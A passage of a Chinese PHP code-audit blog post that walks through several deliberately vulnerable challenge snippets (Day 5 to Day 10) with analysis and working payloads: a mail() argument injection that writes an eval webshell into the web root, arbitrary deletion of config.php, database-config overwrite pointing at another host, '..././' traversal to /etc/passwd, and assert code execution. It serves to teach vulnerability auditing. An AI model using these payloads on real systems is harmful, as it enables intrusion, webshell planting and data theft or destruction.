<h2 id="Day-5-Postcard"><a href="#Day-5-Postcard" class="headerlink" title="Day 5 - Postcard"></a>Day 5 - Postcard</h2><h3 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">      <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这段代码实现了发送邮件的功能，其中关于mail的大部分参数属于用户可控的输入，mail函数的手册如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bool mail ( string $to  电子邮件收件人,或收件人列表</span><br><span class="line">, string $subject       电子邮件的主题</span><br><span class="line">, string $message       邮件内容</span><br><span class="line">[, string $additional_headers 指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</span><br><span class="line">[, string $additional_parameters ]] ) 许多web应用使用它设置发送者的地址和返回路径</span><br></pre></td></tr></table></figure>
<p>当调用php内置mail函数时，如果没有恰当过滤第5个参数，可以被注入恶意参数，引发命令执行漏洞。php将调用execve()执行sendmail程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve("/bin/sh","sh","-c","/usr/sbin/sendmail -t -i -f admin@localhost"],[/* 24 environment var */])</span><br></pre></td></tr></table></figure>
<p>虽然PHP会使用escapeshellcmd函数来过滤参数的内容，对特殊字符的转义来防止恶意命令执行（&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A and \xFF.’ “这些字符都不能使用），但是我们可以添加命令执行的其他参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-X logfile是记录log文件的，就是可以写文件；</span><br><span class="line">-C file是临时加载一个配置文件，就是可以读文件；</span><br><span class="line">-O option=value 是临时设置一个邮件存储的临时目录的配置。</span><br></pre></td></tr></table></figure>
<p>代码中进行了两次过滤，分别是<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>和<code>escapeshellarg($email)</code>。我们接下来分别分析这两个过滤函数。关于 <code>filter_var()</code> 中 <code>FILTER_VALIDATE_EMAIL</code>这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">PHP FILTER_VALIDATE_EMAIL</a> 。有个结论为<code>none of the special characters in this local part are allowed outside quotation marks</code> ，表示所有的特殊符号必须放在双引号中，这样便可绕过对特殊符号的过滤问题，测试如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Tonys&gt;PHP -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(filter_var('"...\.llowed"@vsplate.com',FILTER_VALIDATE_EMAIL));</span><br><span class="line">string(25) ""...\.llowed"@vsplate.com"</span><br><span class="line">php &gt; var_dump(filter_var('\'is."\'\ not\ allowed"@vsplate.com',FILTER_VALIDATE_EMAIL));</span><br><span class="line">string(33) "'is."'\ not\ allowed"@vsplate.com"</span><br></pre></td></tr></table></figure>
<p>接下来分析<code>escapeshellarg</code>，<code>escapeshellarg()</code> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 <code>shell</code> 函数，<code>shell</code>函数包含<code>exec()</code>，<code>system()</code>执行运算符(反引号)。</p>
<p>前面说过了PHP的 <code>mail()</code> 函数在底层调用了 <code>escapeshellcmd()</code> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过<code>filter_var()</code> 的检测，但还是会被 <code>escapeshellcmd()*</code>处理。然而 <code>escapeshellcmd()</code>和 <code>escapeshellarg</code> 一起使用，会造成特殊字符逃逸。具体参考如下paper：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/164/</span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a.&quot;&apos;\ -OQueueDirectory=\%0D&lt;?=eval($_GET[c])?&gt;\ -X/var/www/html/&quot;@a.php</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/</span></span><br></pre></td></tr></table></figure>
<h2 id="Day-6-Frost-Pattern"><a href="#Day-6-Frost-Pattern" class="headerlink" title="Day 6 - Frost Pattern"></a>Day 6 - Frost Pattern</h2><h3 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unknown action'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">    $token = md5($seed);</span><br><span class="line">    file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">    $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">    unlink(<span class="string">'/tmp/tokens/'</span> . $file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑为生成用户的token，并根据token删除相应的文件。在删除时对用户输入的数据进行了控制，非<code>a-z</code>，<code>-</code>，<code>.</code>，<code>_</code>的字符都将替换为空。</p>
<p>但在这个正则中，<code>-</code>并没有进行转义操作，因此实际意思为非46-122的ascii中的字符替换为空。</p>
<h3 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>应为正则的设置不正确，可造成任意文件删除，对于一些cms系统，删除其安装文件可重装cms，进而控制后台以及服务器端。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=delete&amp;data=../../config.php</span><br></pre></td></tr></table></figure>
<h2 id="Day-7-Bells"><a href="#Day-7-Bells" class="headerlink" title="Day 7 - Bells"></a>Day 7 - Bells</h2><h3 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $config, $db;</span><br><span class="line">  <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">    $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">      $config[<span class="string">'dbhost'</span>],</span><br><span class="line">      $config[<span class="string">'dbuser'</span>],</span><br><span class="line">      $config[<span class="string">'dbpass'</span>],</span><br><span class="line">      $config[<span class="string">'dbname'</span>]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">  $stmt = $db-&gt;prepare($sql);</span><br><span class="line">  $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">  $stmt-&gt;bind_result($name);</span><br><span class="line">  $stmt-&gt;execute();</span><br><span class="line">  $stmt-&gt;fetch();</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码为sql查询逻辑，获取输入id，使用了面向对象风格，其中<code>bind_param</code>中各个类型表示的意思如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i	corresponding variable has type integer</span><br><span class="line">d	corresponding variable has type double</span><br><span class="line">s	corresponding variable has type string</span><br><span class="line">b	corresponding variable is a blob and will be sent in packets</span><br></pre></td></tr></table></figure>
<p>但是代码代码中使用了<code>parse_url</code>，明显存在变量覆盖漏洞，数据库的各种参数都是可控的，以及返回结构都可以进行伪造。</p>
<h3 id="漏洞验证-6"><a href="#漏洞验证-6" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地构建数据库，返回结构进行自定义，可绕过服务端数据库中数据的检测。</p>
<p>payload：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=malicious&amp;id=1</span><br></pre></td></tr></table></figure>
<h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><h3 id="漏洞代码-7"><a href="#漏洞代码-7" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">    $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"/lang/$sanitizedLang"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $lang = $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] ?? <span class="string">'en'</span>;</span><br><span class="line">    <span class="keyword">return</span> $lang;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑逻辑为加载设置加载文本时所展示的语言，并通过<code>str_replace</code>对输入的数据进行了替换，然后通过<code>require_once</code>包含该文件。但<code>str_replace</code>只进行了单次替换，包含的路径依然可控。</p>
<p>测试如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(str_replace(<span class="string">'../'</span>, <span class="string">''</span>, <span class="string">'../etc/passwd'</span>));</span><br><span class="line">string(<span class="number">10</span>) <span class="string">"etc/passwd"</span></span><br><span class="line">php &gt; var_dump(str_replace(<span class="string">'../'</span>, <span class="string">''</span>, <span class="string">'..././etc/passwd'</span>));</span><br><span class="line">string(<span class="number">13</span>) <span class="string">"../etc/passwd"</span></span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-7"><a href="#漏洞验证-7" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>request head处添加如下请求，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accept-language: ..././..././..././etc/passwd</span><br></pre></td></tr></table></figure>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><h3 id="漏洞代码："><a href="#漏洞代码：" class="headerlink" title="漏洞代码："></a>漏洞代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">  header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">  goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>extract作用为从数组中将变量导入到当前的符号表，效果如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$var_array</span> = array(<span class="string">"color"</span> =&gt; <span class="string">"blue"</span>,</span><br><span class="line">php (                    <span class="string">"size"</span>  =&gt; <span class="string">"medium"</span>,</span><br><span class="line">php (                    <span class="string">"shape"</span> =&gt; <span class="string">"sphere"</span>);</span><br><span class="line">php &gt; var_dump(extract(<span class="variable">$var_array</span>));</span><br><span class="line">int(<span class="number">3</span>)</span><br><span class="line">php &gt; var_dump(<span class="variable">$color</span>);</span><br><span class="line">string(<span class="number">4</span>) <span class="string">"blue"</span></span><br></pre></td></tr></table></figure>
<p>代码对<code>$pi</code>进行了过滤，通过<code>is_numeric</code>规定必须为数字类型的变量，需要注意的点如下：</p>
<ul>
<li>判读是否为数字，如果提交的参数是数字或者数字字符串就正常，也就是TRUE，否则返回FALSE。仅用is_numeric判断而不用intval函数转换，就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。</li>
<li>php7以后十六进制字符串不再被认为是数字。</li>
</ul>
<p>在输入为字符串的情况下，执行了<code>goAway()</code>函数，但没有进行<code>die()</code>或者<code>exit()</code>，操作，这导致后面的代码依然可以执行。<code>assert()</code>为断言函数，这是一个调试函数，它会检测一个断言是否为False。它与eval的用法类似，可以将字符串当成PHP代码来执行，但是断言这个功能应该只被用来调试。</p>
<ul>
<li>php7以后<code>assert</code>默认不再可以执行代码，菜刀在实现文件管理器的时候用的恰好也是assert函数，这也导致菜刀没办法在PHP7上正常运行。 </li>
</ul>
<h3 id="漏洞验证-8"><a href="#漏洞验证-8" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi=phpinfo()</span><br></pre></td></tr></table></figure>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Sys71m</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://www.sys71m.top/2020/02/13/PHP代码审计(一)/">https://www.sys71m.top/2020/02/13/PHP代码审计(一)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/14/PHP代码审计(二)/"><i class="fa fa-chevron-left">  </i><span>PHP代码审计(二)</span></a></div><div class="next-post pull-right"><a href="/2020/02/08/Java代码审计(一)/"><span>Java代码审计(一)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'https://www.sys71m.top/2020/02/13/PHP代码审计(一)/';
  this.page.identifier = '2020/02/13/PHP代码审计(一)/';
  this.page.title = 'PHP代码审计(一)';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'sys71m' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://sys71m.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2023 By Sys71m</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>